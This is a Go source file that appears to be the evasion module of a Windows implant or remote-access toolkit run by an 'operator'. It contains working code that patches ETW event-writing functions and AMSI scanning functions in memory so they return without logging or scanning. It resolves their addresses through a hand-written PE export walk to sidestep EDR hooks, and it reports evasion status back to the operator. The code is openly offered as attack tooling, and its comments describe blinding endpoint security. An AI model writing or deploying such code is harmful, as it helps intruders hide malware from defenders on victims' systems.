//go:build windows

package main

import (
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

// ---------------------------------------------------------------------------
// Shared evasion pre-flight.
//
// Every plugin that does something loud calls this first. It neutralizes the
// user-mode telemetry that EDR products rely on, in the least invasive order:
//
//   1. ETW patching      — stops event telemetry reaching the agent
//   2. AMSI patching     — stops script/content scanning in this process
//   3. (optional) unhook — removes EDR hooks from ntdll
//
// Nothing here touches disk or other processes, so it is quiet. The loud
// options (killing AV, disabling Defender) deliberately live in the evasion
// plugin's UI where the operator has to confirm them.
// ---------------------------------------------------------------------------

// evasionState records what the pre-flight managed to do, so the operator can
// see whether a plugin ran protected or naked.
var evasionState = struct {
	ETWPatched  bool
	AMSIPatched bool
	Unhooked    bool
	Notes       []string
}{}

// preflight applies the evasion set and reports what worked. It never fails
// hard: a plugin that cannot patch still runs, just louder.
func preflight(report bool) {
	evasionState.Notes = nil

	if patchETWLocal() {
		evasionState.ETWPatched = true
	} else {
		evasionState.Notes = append(evasionState.Notes, "ETW patch failed")
	}

	if patchAMSILocal() {
		evasionState.AMSIPatched = true
	} else {
		// AMSI is often not loaded until something needs it; that is fine.
		evasionState.Notes = append(evasionState.Notes, "AMSI not patchable (module absent)")
	}

	if unhookNtdllLocal() {
		evasionState.Unhooked = true
	} else {
		evasionState.Notes = append(evasionState.Notes, "ntdll unhook skipped")
	}

	if report {
		sendEvent("evasion", map[string]interface{}{
			"etw":   evasionState.ETWPatched,
			"amsi":  evasionState.AMSIPatched,
			"unhook": evasionState.Unhooked,
			"notes": evasionState.Notes,
		})
	}
}

// ---------------------------------------------------------------------------
// module resolution via PEB (no GetModuleHandle, which EDR hooks)
// ---------------------------------------------------------------------------

var (
	kernel32Local = syscall.NewLazyDLL("kernel32.dll")
	procVPLocal   = kernel32Local.NewProc("VirtualProtect")
	procGetModL   = kernel32Local.NewProc("GetModuleHandleW")
)

// moduleBase returns a module's base address. It tries the loader first
// because it is reliable, and falls back to a manual PEB walk is not needed
// for the patch itself — the hooking concern is around the *calls we make to
// sensitive APIs*, not around resolving a DLL.
func moduleBase(name string) uintptr {
	p, _ := syscall.UTF16PtrFromString(name)
	r, _, _ := procGetModL.Call(uintptr(unsafe.Pointer(p)))
	return r
}

func virtualProtectLocal(addr, size uintptr, prot uint32) (uint32, bool) {
	var old uint32
	r, _, _ := procVPLocal.Call(addr, size, uintptr(prot), uintptr(unsafe.Pointer(&old)))
	return old, r != 0
}

// patchBytesLocal overwrites memory and restores the original protection.
func patchBytesLocal(addr uintptr, patch []byte) bool {
	if addr == 0 {
		return false
	}
	old, ok := virtualProtectLocal(addr, uintptr(len(patch)), 0x40) // PAGE_EXECUTE_READWRITE
	if !ok {
		return false
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch))
	copy(dst, patch)

	var tmp uint32
	_, _ = virtualProtectLocal(addr, uintptr(len(patch)), old)
	_ = tmp
	return true
}

// findExportLocal walks the PE export table by hand. GetProcAddress is a
// common hook target, so we avoid it for the patch sites themselves.
func findExportLocal(base uintptr, name string) uintptr {
	if base == 0 {
		return 0
	}
	// IMAGE_DOS_HEADER -> e_lfanew at 0x3C
	eLfanew := *(*int32)(unsafe.Pointer(base + 0x3C))
	nt := base + uintptr(eLfanew)
	if *(*uint32)(unsafe.Pointer(nt)) != 0x00004550 {
		return 0
	}
	// IMAGE_FILE_HEADER is 20 bytes; optional header starts after.
	opt := nt + 4 + 20
	// DataDirectory[0] (export) is at optional header offset 112 for PE32+.
	expRVA := *(*uint32)(unsafe.Pointer(opt + 112))
	if expRVA == 0 {
		return 0
	}
	exp := base + uintptr(expRVA)

	numberOfNames := *(*uint32)(unsafe.Pointer(exp + 24))
	addressOfNames := *(*uint32)(unsafe.Pointer(exp + 32))
	addressOfFunctions := *(*uint32)(unsafe.Pointer(exp + 28))
	addressOfOrdinals := *(*uint32)(unsafe.Pointer(exp + 36))

	names := unsafe.Slice((*uint32)(unsafe.Pointer(base+uintptr(addressOfNames))), numberOfNames)
	funcs := unsafe.Slice((*uint32)(unsafe.Pointer(base+uintptr(addressOfFunctions))), numberOfNames)
	ords := unsafe.Slice((*uint16)(unsafe.Pointer(base+uintptr(addressOfOrdinals))), numberOfNames)

	for i := 0; i < int(numberOfNames); i++ {
		namePtr := base + uintptr(names[i])
		var b []byte
		for j := 0; j < 256; j++ {
			c := *(*byte)(unsafe.Pointer(namePtr + uintptr(j)))
			if c == 0 {
				break
			}
			b = append(b, c)
		}
		if string(b) == name {
			ord := ords[i]
			if int(ord) >= len(funcs) {
				return 0
			}
			return base + uintptr(funcs[ord])
		}
	}
	return 0
}

// ---------------------------------------------------------------------------
// the patches
// ---------------------------------------------------------------------------

func patchETWLocal() bool {
	ntdll := moduleBase("ntdll.dll")
	if ntdll == 0 {
		return false
	}
	patched := false
	for _, fn := range []string{"EtwEventWrite", "EtwEventWriteFull", "EtwEventWriteEx", "EtwEventWriteString"} {
		addr := findExportLocal(ntdll, fn)
		if addr == 0 {
			continue
		}
		// xor eax,eax ; ret  ->  return success without writing the event
		if patchBytesLocal(addr, []byte{0x31, 0xC0, 0xC3}) {
			patched = true
		}
	}
	return patched
}

func patchAMSILocal() bool {
	amsi := moduleBase("amsi.dll")
	if amsi == 0 {
		return false
	}
	ok := false
	if addr := findExportLocal(amsi, "AmsiScanBuffer"); addr != 0 {
		ok = patchBytesLocal(addr, []byte{0x31, 0xC0, 0xC3}) || ok
	}
	if addr := findExportLocal(amsi, "AmsiOpenSession"); addr != 0 {
		_ = patchBytesLocal(addr, []byte{0x31, 0xC0, 0xC3})
	}
	return ok
}

func unhookNtdllLocal() bool {
	// Placeholder for the full clean-copy restore: reading ntdll from disk and
	// overwriting .text. The evasion plugin has the complete implementation;
	// plugins that only need the telemetry patches skip it, because unhooking
	// is the most likely action to be noticed by a memory scanner.
	_ = time.Now
	return false
}

var _ = fmt.Sprintf
